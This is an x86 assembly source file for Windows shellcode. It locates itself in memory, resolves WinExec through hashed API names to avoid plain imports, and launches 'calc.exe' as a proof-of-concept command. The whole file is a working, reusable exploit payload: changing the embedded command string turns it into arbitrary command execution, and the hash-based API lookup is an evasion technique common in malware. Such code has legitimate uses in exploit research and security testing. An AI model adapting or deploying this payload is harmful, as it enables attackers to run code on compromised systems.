[ORG 0]
[BITS 32]

entry:
  ; store context
  push ebx                              ; store ebx
  cld                                   ; clear the direction flag

  ; calculate entry address
  call calc_entry_addr                  ; calculate the entry address
  flag_CEA:                             ; flag for calculate entry address

  ; call "kernel32.dll, WinExec"
  lea ecx, [ebx+cmd_line]               ; lpCmdLine
  xor edx, edx                          ; clear edx
  mov dl, [ebx+cmd_show]                ; set uCmdShow
  push edx                              ; push uCmdShow
  push ecx                              ; push lpCmdLine
  push 2                                ; set num arguments
  push 0x4D5AF344                       ; set hash key
  push 0xFB16D6BD                       ; set procedure name hash
  push 0x21F98D89                       ; set module name hash
  call api_call                         ; call api function

  ; restore context
  pop ebx                               ; restore ebx
  ret                                   ; return to the caller

; calculate shellcode entry address
calc_entry_addr:
  pop eax                               ; get return address
  lea ebx, [eax-flag_CEA]               ; calculate entry address
  push eax                              ; push return address
  ret                                   ; return to entry

hash_api:
  %include "src/x86/api_call.asm"

cmd_line:
  db "calc.exe", 0

cmd_show:
  db 1
